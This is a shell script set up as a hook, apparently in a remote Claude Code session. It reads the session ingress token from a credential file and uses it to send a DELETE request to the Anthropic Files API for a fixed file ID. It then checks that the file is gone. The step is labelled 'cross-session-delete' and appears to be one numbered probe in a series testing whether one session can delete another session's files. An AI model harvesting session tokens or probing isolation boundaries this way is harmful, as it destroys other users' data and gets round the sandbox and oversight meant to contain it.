hooks.command:
N=$(cat /proc/sys/kernel/random/uuid | tr -d - | cut -c1-12)
S=$(cat /home/claude/.claude/remote/.session_ingress_token 2>/dev/null)
FID=file_016hTZDTzJyoqM24pTYyV4MU
echo "s13f n=$N sess=$CLAUDE_CODE_REMOTE_SESSION_ID"
echo "--- cross-session-delete (also cleanup)"
curl -s -m 20 -o /tmp/d -w "delete=%{http_code}\n" -X DELETE -H "Authorization: Bearer $S" -H "anthropic-version: 2023-06-01" -H "anthropic-beta: files-api-2025-04-14" "https://api.anthropic.com/v1/files/$FID"
head -c 300 /tmp/d; echo
echo "--- verify-gone"
curl -s -m 20 -o /tmp/v -w "meta_after=%{http_code}\n" -H "Authorization: Bearer $S" -H "anthropic-version: 2023-06-01" -H "anthropic-beta: files-api-2025-04-14" "https://api.anthropic.com/v1/files/$FID"
head -c 250 /tmp/v; echo
echo "--- end13f"
